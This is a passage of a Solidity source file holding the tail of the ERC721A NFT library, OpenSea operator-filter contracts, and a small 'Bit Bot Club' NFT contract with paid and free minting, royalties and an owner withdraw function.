1047             // We can directly add to the `balance` and `numberMinted`.
1048             _packedAddressData[to] += quantity * ((1 << _BITPOS_NUMBER_MINTED) | 1);
1049 
1050             // Updates:
1051             // - `address` to the owner.
1052             // - `startTimestamp` to the timestamp of minting.
1053             // - `burned` to `false`.
1054             // - `nextInitialized` to `quantity == 1`.
1055             _packedOwnerships[startTokenId] = _packOwnershipData(
1056                 to,
1057                 _nextInitializedFlag(quantity) | _nextExtraData(address(0), to, 0)
1058             );
1059 
1060             uint256 toMasked;
1061             uint256 end = startTokenId + quantity;
1062 
1063             // Use assembly to loop and emit the `Transfer` event for gas savings.
1064             // The duplicated `log4` removes an extra check and reduces stack juggling.
1065             // The assembly, together with the surrounding Solidity code, have been
1066             // delicately arranged to nudge the compiler into producing optimized opcodes.
1067             assembly {
1068                 // Mask `to` to the lower 160 bits, in case the upper bits somehow aren't clean.
1069                 toMasked := and(to, _BITMASK_ADDRESS)
1070                 // Emit the `Transfer` event.
1071                 log4(
1072                     0, // Start of data (0, since no data).
1073                     0, // End of data (0, since no data).
1074                     _TRANSFER_EVENT_SIGNATURE, // Signature.
1075                     0, // `address(0)`.
1076                     toMasked, // `to`.
1077                     startTokenId // `tokenId`.
1078                 )
1079 
1080                 // The `iszero(eq(,))` check ensures that large values of `quantity`
1081                 // that overflows uint256 will make the loop run out of gas.
1082                 // The compiler will optimize the `iszero` away for performance.
1083                 for {
1084                     let tokenId := add(startTokenId, 1)
1085                 } iszero(eq(tokenId, end)) {
1086                     tokenId := add(tokenId, 1)
1087                 } {
1088                     // Emit the `Transfer` event. Similar to above.
1089                     log4(0, 0, _TRANSFER_EVENT_SIGNATURE, 0, toMasked, tokenId)
1090                 }
1091             }
1092             if (toMasked == 0) revert MintToZeroAddress();
1093 
1094             _currentIndex = end;
1095         }
1096         _afterTokenTransfers(address(0), to, startTokenId, quantity);
1097     }
1098 
1099     /**
1100      * @dev Mints `quantity` tokens and transfers them to `to`.
1101      *
1102      * This function is intended for efficient minting only during contract creation.
1103      *
1104      * It emits only one {ConsecutiveTransfer} as defined in
1105      * [ERC2309](https://eips.ethereum.org/EIPS/eip-2309),
1106      * instead of a sequence of {Transfer} event(s).
1107      *
1108      * Calling this function outside of contract creation WILL make your contract
1109      * non-compliant with the ERC721 standard.
1110      * For full ERC721 compliance, substituting ERC721 {Transfer} event(s) with the ERC2309
1111      * {ConsecutiveTransfer} event is only permissible during contract creation.
1112      *
1113      * Requirements:
1114      *
1115      * - `to` cannot be the zero address.
1116      * - `quantity` must be greater than 0.
1117      *
1118      * Emits a {ConsecutiveTransfer} event.
1119      */
1120     function _mintERC2309(address to, uint256 quantity) internal virtual {
1121         uint256 startTokenId = _currentIndex;
1122         if (to == address(0)) revert MintToZeroAddress();
1123         if (quantity == 0) revert MintZeroQuantity();
1124         if (quantity > _MAX_MINT_ERC2309_QUANTITY_LIMIT) revert MintERC2309QuantityExceedsLimit();
1125 
1126         _beforeTokenTransfers(address(0), to, startTokenId, quantity);
1127 
1128         // Overflows are unrealistic due to the above check for `quantity` to be below the limit.
1129         unchecked {
1130             // Updates:
1131             // - `balance += quantity`.
1132             // - `numberMinted += quantity`.
1133             //
1134             // We can directly add to the `balance` and `numberMinted`.
1135             _packedAddressData[to] += quantity * ((1 << _BITPOS_NUMBER_MINTED) | 1);
1136 
1137             // Updates:
1138             // - `address` to the owner.
1139             // - `startTimestamp` to the timestamp of minting.
1140             // - `burned` to `false`.
1141             // - `nextInitialized` to `quantity == 1`.
1142             _packedOwnerships[startTokenId] = _packOwnershipData(
1143                 to,
1144                 _nextInitializedFlag(quantity) | _nextExtraData(address(0), to, 0)
1145             );
1146 
1147             emit ConsecutiveTransfer(startTokenId, startTokenId + quantity - 1, address(0), to);
1148 
1149             _currentIndex = startTokenId + quantity;
1150         }
1151         _afterTokenTransfers(address(0), to, startTokenId, quantity);
1152     }
1153 
1154     /**
1155      * @dev Safely mints `quantity` tokens and transfers them to `to`.
1156      *
1157      * Requirements:
1158      *
1159      * - If `to` refers to a smart contract, it must implement
1160      * {IERC721Receiver-onERC721Received}, which is called for each safe transfer.
1161      * - `quantity` must be greater than 0.
1162      *
1163      * See {_mint}.
1164      *
1165      * Emits a {Transfer} event for each mint.
1166      */
1167     function _safeMint(
1168         address to,
1169         uint256 quantity,
1170         bytes memory _data
1171     ) internal virtual {
1172         _mint(to, quantity);
1173 
1174         unchecked {
1175             if (to.code.length != 0) {
1176                 uint256 end = _currentIndex;
1177                 uint256 index = end - quantity;
1178                 do {
1179                     if (!_checkContractOnERC721Received(address(0), to, index++, _data)) {
1180                         revert TransferToNonERC721ReceiverImplementer();
1181                     }
1182                 } while (index < end);
1183                 // Reentrancy protection.
1184                 if (_currentIndex != end) revert();
1185             }
1186         }
1187     }
1188 
1189     /**
1190      * @dev Equivalent to `_safeMint(to, quantity, '')`.
1191      */
1192     function _safeMint(address to, uint256 quantity) internal virtual {
1193         _safeMint(to, quantity, '');
1194     }
1195 
1196     // =============================================================
1197     //                        BURN OPERATIONS
1198     // =============================================================
1199 
1200     /**
1201      * @dev Equivalent to `_burn(tokenId, false)`.
1202      */
1203     function _burn(uint256 tokenId) internal virtual {
1204         _burn(tokenId, false);
1205     }
1206 
1207     /**
1208      * @dev Destroys `tokenId`.
1209      * The approval is cleared when the token is burned.
1210      *
1211      * Requirements:
1212      *
1213      * - `tokenId` must exist.
1214      *
1215      * Emits a {Transfer} event.
1216      */
1217     function _burn(uint256 tokenId, bool approvalCheck) internal virtual {
1218         uint256 prevOwnershipPacked = _packedOwnershipOf(tokenId);
1219 
1220         address from = address(uint160(prevOwnershipPacked));
1221 
1222         (uint256 approvedAddressSlot, address approvedAddress) = _getApprovedSlotAndAddress(tokenId);
1223 
1224         if (approvalCheck) {
1225             // The nested ifs save around 20+ gas over a compound boolean condition.
1226             if (!_isSenderApprovedOrOwner(approvedAddress, from, _msgSenderERC721A()))
1227                 if (!isApprovedForAll(from, _msgSenderERC721A())) revert TransferCallerNotOwnerNorApproved();
1228         }
1229 
1230         _beforeTokenTransfers(from, address(0), tokenId, 1);
1231 
1232         // Clear approvals from the previous owner.
1233         assembly {
1234             if approvedAddress {
1235                 // This is equivalent to `delete _tokenApprovals[tokenId]`.
1236                 sstore(approvedAddressSlot, 0)
1237             }
1238         }
1239 
1240         // Underflow of the sender's balance is impossible because we check for
1241         // ownership above and the recipient's balance can't realistically overflow.
1242         // Counter overflow is incredibly unrealistic as `tokenId` would have to be 2**256.
1243         unchecked {
1244             // Updates:
1245             // - `balance -= 1`.
1246             // - `numberBurned += 1`.
1247             //
1248             // We can directly decrement the balance, and increment the number burned.
1249             // This is equivalent to `packed -= 1; packed += 1 << _BITPOS_NUMBER_BURNED;`.
1250             _packedAddressData[from] += (1 << _BITPOS_NUMBER_BURNED) - 1;
1251 
1252             // Updates:
1253             // - `address` to the last owner.
1254             // - `startTimestamp` to the timestamp of burning.
1255             // - `burned` to `true`.
1256             // - `nextInitialized` to `true`.
1257             _packedOwnerships[tokenId] = _packOwnershipData(
1258                 from,
1259                 (_BITMASK_BURNED | _BITMASK_NEXT_INITIALIZED) | _nextExtraData(from, address(0), prevOwnershipPacked)
1260             );
1261 
1262             // If the next slot may not have been initialized (i.e. `nextInitialized == false`) .
1263             if (prevOwnershipPacked & _BITMASK_NEXT_INITIALIZED == 0) {
1264                 uint256 nextTokenId = tokenId + 1;
1265                 // If the next slot's address is zero and not burned (i.e. packed value is zero).
1266                 if (_packedOwnerships[nextTokenId] == 0) {
1267                     // If the next slot is within bounds.
1268                     if (nextTokenId != _currentIndex) {
1269                         // Initialize the next slot to maintain correctness for `ownerOf(tokenId + 1)`.
1270                         _packedOwnerships[nextTokenId] = prevOwnershipPacked;
1271                     }
1272                 }
1273             }
1274         }
1275 
1276         emit Transfer(from, address(0), tokenId);
1277         _afterTokenTransfers(from, address(0), tokenId, 1);
1278 
1279         // Overflow not possible, as _burnCounter cannot be exceed _currentIndex times.
1280         unchecked {
1281             _burnCounter++;
1282         }
1283     }
1284 
1285     // =============================================================
1286     //                     EXTRA DATA OPERATIONS
1287     // =============================================================
1288 
1289     /**
1290      * @dev Directly sets the extra data for the ownership data `index`.
1291      */
1292     function _setExtraDataAt(uint256 index, uint24 extraData) internal virtual {
1293         uint256 packed = _packedOwnerships[index];
1294         if (packed == 0) revert OwnershipNotInitializedForExtraData();
1295         uint256 extraDataCasted;
1296         // Cast `extraData` with assembly to avoid redundant masking.
1297         assembly {
1298             extraDataCasted := extraData
1299         }
1300         packed = (packed & _BITMASK_EXTRA_DATA_COMPLEMENT) | (extraDataCasted << _BITPOS_EXTRA_DATA);
1301         _packedOwnerships[index] = packed;
1302     }
1303 
1304     /**
1305      * @dev Called during each token transfer to set the 24bit `extraData` field.
1306      * Intended to be overridden by the cosumer contract.
1307      *
1308      * `previousExtraData` - the value of `extraData` before transfer.
1309      *
1310      * Calling conditions:
1311      *
1312      * - When `from` and `to` are both non-zero, `from`'s `tokenId` will be
1313      * transferred to `to`.
1314      * - When `from` is zero, `tokenId` will be minted for `to`.
1315      * - When `to` is zero, `tokenId` will be burned by `from`.
1316      * - `from` and `to` are never both zero.
1317      */
1318     function _extraData(
1319         address from,
1320         address to,
1321         uint24 previousExtraData
1322     ) internal view virtual returns (uint24) {}
1323 
1324     /**
1325      * @dev Returns the next extra data for the packed ownership data.
1326      * The returned result is shifted into position.
1327      */
1328     function _nextExtraData(
1329         address from,
1330         address to,
1331         uint256 prevOwnershipPacked
1332     ) private view returns (uint256) {
1333         uint24 extraData = uint24(prevOwnershipPacked >> _BITPOS_EXTRA_DATA);
1334         return uint256(_extraData(from, to, extraData)) << _BITPOS_EXTRA_DATA;
1335     }
1336 
1337     // =============================================================
1338     //                       OTHER OPERATIONS
1339     // =============================================================
1340 
1341     /**
1342      * @dev Returns the message sender (defaults to `msg.sender`).
1343      *
1344      * If you are writing GSN compatible contracts, you need to override this function.
1345      */
1346     function _msgSenderERC721A() internal view virtual returns (address) {
1347         return msg.sender;
1348     }
1349 
1350     /**
1351      * @dev Converts a uint256 to its ASCII string decimal representation.
1352      */
1353     function _toString(uint256 value) internal pure virtual returns (string memory str) {
1354         assembly {
1355             // The maximum value of a uint256 contains 78 digits (1 byte per digit), but
1356             // we allocate 0xa0 bytes to keep the free memory pointer 32-byte word aligned.
1357             // We will need 1 word for the trailing zeros padding, 1 word for the length,
1358             // and 3 words for a maximum of 78 digits. Total: 5 * 0x20 = 0xa0.
1359             let m := add(mload(0x40), 0xa0)
1360             // Update the free memory pointer to allocate.
1361             mstore(0x40, m)
1362             // Assign the `str` to the end.
1363             str := sub(m, 0x20)
1364             // Zeroize the slot after the string.
1365             mstore(str, 0)
1366 
1367             // Cache the end of the memory to calculate the length later.
1368             let end := str
1369 
1370             // We write the string from rightmost digit to leftmost digit.
1371             // The following is essentially a do-while loop that also handles the zero case.
1372             // prettier-ignore
1373             for { let temp := value } 1 {} {
1374                 str := sub(str, 1)
1375                 // Write the character to the pointer.
1376                 // The ASCII index of the '0' character is 48.
1377                 mstore8(str, add(48, mod(temp, 10)))
1378                 // Keep dividing `temp` until zero.
1379                 temp := div(temp, 10)
1380                 // prettier-ignore
1381                 if iszero(temp) { break }
1382             }
1383 
1384             let length := sub(end, str)
1385             // Move the pointer 32 bytes leftwards to make room for the length.
1386             str := sub(str, 0x20)
1387             // Store the length.
1388             mstore(str, length)
1389         }
1390     }
1391 }
1392 
1393 
1394 interface IOperatorFilterRegistry {
1395     function isOperatorAllowed(address registrant, address operator) external view returns (bool);
1396     function register(address registrant) external;
1397     function registerAndSubscribe(address registrant, address subscription) external;
1398     function registerAndCopyEntries(address registrant, address registrantToCopy) external;
1399     function unregister(address addr) external;
1400     function updateOperator(address registrant, address operator, bool filtered) external;
1401     function updateOperators(address registrant, address[] calldata operators, bool filtered) external;
1402     function updateCodeHash(address registrant, bytes32 codehash, bool filtered) external;
1403     function updateCodeHashes(address registrant, bytes32[] calldata codeHashes, bool filtered) external;
1404     function subscribe(address registrant, address registrantToSubscribe) external;
1405     function unsubscribe(address registrant, bool copyExistingEntries) external;
1406     function subscriptionOf(address addr) external returns (address registrant);
1407     function subscribers(address registrant) external returns (address[] memory);
1408     function subscriberAt(address registrant, uint256 index) external returns (address);
1409     function copyEntriesOf(address registrant, address registrantToCopy) external;
1410     function isOperatorFiltered(address registrant, address operator) external returns (bool);
1411     function isCodeHashOfFiltered(address registrant, address operatorWithCode) external returns (bool);
1412     function isCodeHashFiltered(address registrant, bytes32 codeHash) external returns (bool);
1413     function filteredOperators(address addr) external returns (address[] memory);
1414     function filteredCodeHashes(address addr) external returns (bytes32[] memory);
1415     function filteredOperatorAt(address registrant, uint256 index) external returns (address);
1416     function filteredCodeHashAt(address registrant, uint256 index) external returns (bytes32);
1417     function isRegistered(address addr) external returns (bool);
1418     function codeHashOf(address addr) external returns (bytes32);
1419 }
1420 
1421 
1422 /**
1423  * @title  OperatorFilterer
1424  * @notice Abstract contract whose constructor automatically registers and optionally subscribes to or copies another
1425  *         registrant's entries in the OperatorFilterRegistry.
1426  * @dev    This smart contract is meant to be inherited by token contracts so they can use the following:
1427  *         - `onlyAllowedOperator` modifier for `transferFrom` and `safeTransferFrom` methods.
1428  *         - `onlyAllowedOperatorApproval` modifier for `approve` and `setApprovalForAll` methods.
1429  */
1430 abstract contract OperatorFilterer {
1431     error OperatorNotAllowed(address operator);
1432 
1433     IOperatorFilterRegistry public constant OPERATOR_FILTER_REGISTRY =
1434         IOperatorFilterRegistry(0x000000000000AAeB6D7670E522A718067333cd4E);
1435 
1436     constructor(address subscriptionOrRegistrantToCopy, bool subscribe) {
1437         // If an inheriting token contract is deployed to a network without the registry deployed, the modifier
1438         // will not revert, but the contract will need to be registered with the registry once it is deployed in
1439         // order for the modifier to filter addresses.
1440         if (address(OPERATOR_FILTER_REGISTRY).code.length > 0) {
1441             if (subscribe) {
1442                 OPERATOR_FILTER_REGISTRY.registerAndSubscribe(address(this), subscriptionOrRegistrantToCopy);
1443             } else {
1444                 if (subscriptionOrRegistrantToCopy != address(0)) {
1445                     OPERATOR_FILTER_REGISTRY.registerAndCopyEntries(address(this), subscriptionOrRegistrantToCopy);
1446                 } else {
1447                     OPERATOR_FILTER_REGISTRY.register(address(this));
1448                 }
1449             }
1450         }
1451     }
1452 
1453     modifier onlyAllowedOperator(address from) virtual {
1454         // Check registry code length to facilitate testing in environments without a deployed registry.
1455         if (address(OPERATOR_FILTER_REGISTRY).code.length > 0) {
1456             // Allow spending tokens from addresses with balance
1457             // Note that this still allows listings and marketplaces with escrow to transfer tokens if transferred
1458             // from an EOA.
1459             if (from == msg.sender) {
1460                 _;
1461                 return;
1462             }
1463             if (!OPERATOR_FILTER_REGISTRY.isOperatorAllowed(address(this), msg.sender)) {
1464                 revert OperatorNotAllowed(msg.sender);
1465             }
1466         }
1467         _;
1468     }
1469 
1470     modifier onlyAllowedOperatorApproval(address operator) virtual {
1471         // Check registry code length to facilitate testing in environments without a deployed registry.
1472         if (address(OPERATOR_FILTER_REGISTRY).code.length > 0) {
1473             if (!OPERATOR_FILTER_REGISTRY.isOperatorAllowed(address(this), operator)) {
1474                 revert OperatorNotAllowed(operator);
1475             }
1476         }
1477         _;
1478     }
1479 }
1480 
1481 /**
1482  * @title  DefaultOperatorFilterer
1483  * @notice Inherits from OperatorFilterer and automatically subscribes to the default OpenSea subscription.
1484  */
1485 abstract contract TheOperatorFilterer is OperatorFilterer {
1486     address constant DEFAULT_SUBSCRIPTION = address(0x3cc6CddA760b79bAfa08dF41ECFA224f810dCeB6);
1487 
1488     constructor() OperatorFilterer(DEFAULT_SUBSCRIPTION, true) {}
1489 }
1490 
1491 
1492 contract BitBotClub is ERC721A, TheOperatorFilterer {
1493 
1494     address public owner;
1495 
1496     uint256 public maxSupply = 1000;
1497 
1498     uint256 public PRICE = 0.002 ether;
1499 
1500     uint256 public FreeNumTx = 1;
1501 
1502     uint256 private MaxPerTx;
1503 
1504     mapping(address => uint256) private _userForFree;
1505 
1506     mapping(uint256 => uint256) private _userMinted;
1507 
1508     function mint(uint256 amount) payable public {
1509         require(amount <= MaxPerTx);
1510         mintbitbot(amount);
1511     }
1512 
1513     function mintbitbot(uint256 amount) internal {
1514         if (msg.value == 0) {
1515             require(totalSupply() + amount <= maxSupply);
1516             require(amount == 1);
1517             if (totalSupply() > maxSupply / 2) {
1518                 require(_userMinted[block.number] < FreeNum() 
1519                         && _userForFree[tx.origin] < FreeNumTx);
1520                 _userForFree[tx.origin]++;
1521                 _userMinted[block.number]++;
1522             }
1523             _safeMint(msg.sender, 1);
1524         } else {
1525             require(msg.value >= PRICE * amount);
1526             _safeMint(msg.sender, amount);
1527         }
1528     }
1529 
1530     function privateMint(address addr, uint256 amount) public onlyOwner {
1531         require(totalSupply() + amount <= maxSupply);
1532         _safeMint(addr, amount);
1533     }
1534     
1535     modifier onlyOwner {
1536         require(owner == msg.sender);
1537         _;
1538     }
1539 
1540     constructor() ERC721A("Bit Bot Club", "BBC") {
1541         owner = msg.sender;
1542         MaxPerTx = 20;
1543     }
1544 
1545     function tokenURI(uint256 tokenId) public view override returns (string memory) {
1546         return string(abi.encodePacked("ipfs://QmdKWv3JoEA1fbz49FrLkoUeEQvDA582aP94zMHWvhpT39/", _toString(tokenId), ".json"));
1547     }
1548 
1549     function setFreePerAddr(uint256 maxTx, uint256 maxS) external onlyOwner {
1550         FreeNumTx = maxTx;
1551         maxSupply = maxS;
1552     }
1553 
1554     function FreeNum() internal returns (uint256){
1555         return (maxSupply - totalSupply()) / 12;
1556     }
1557 
1558     function royaltyInfo(uint256 _tokenId, uint256 _salePrice) public view virtual returns (address, uint256) {
1559         uint256 royaltyAmount = (_salePrice * 69) / 1000;
1560         return (owner, royaltyAmount);
1561     }
1562 
1563     function withdraw() external onlyOwner {
1564         payable(msg.sender).transfer(address(this).balance);
1565     }
1566 
1567     /////////////////////////////
1568     // OPENSEA FILTER REGISTRY 
1569     /////////////////////////////
1570 
1571     function setApprovalForAll(address operator, bool approved) public override onlyAllowedOperatorApproval(operator) {
1572         super.setApprovalForAll(operator, approved);
1573     }
1574 
1575     function approve(address operator, uint256 tokenId) public payable override onlyAllowedOperatorApproval(operator) {
1576         super.approve(operator, tokenId);
1577     }
1578 
1579     function transferFrom(address from, address to, uint256 tokenId) public payable override onlyAllowedOperator(from) {
1580         super.transferFrom(from, to, tokenId);
1581     }
1582 
1583     function safeTransferFrom(address from, address to, uint256 tokenId) public payable override onlyAllowedOperator(from) {
1584         super.safeTransferFrom(from, to, tokenId);
1585     }
1586 
1587     function safeTransferFrom(address from, address to, uint256 tokenId, bytes memory data)
1588         public
1589         payable
1590         override
1591         onlyAllowedOperator(from)
1592     {
1593         super.safeTransferFrom(from, to, tokenId, data);
1594     }
1595 }